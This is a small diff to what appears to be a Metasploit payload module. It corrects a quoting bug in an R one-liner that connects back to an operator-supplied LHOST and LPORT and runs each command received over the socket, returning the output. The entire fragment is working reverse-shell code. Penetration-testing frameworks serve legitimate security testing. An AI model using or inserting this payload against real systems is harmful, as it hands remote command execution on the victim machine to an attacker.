@@ -38,7 +38,7 @@ module MetasploitModule
   def r_string
     lhost = datastore['LHOST']
     lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-    return "s<-socketConnection(host='#{lhost},port=#{datastore['LPORT']}," +
+    return "s<-socketConnection(host='#{lhost}',port=#{datastore['LPORT']}," +
     "blocking=TRUE,server=FALSE,open='r+');while(TRUE){writeLines(readLines" +
     "(pipe(readLines(s, 1))),s)}"
   end
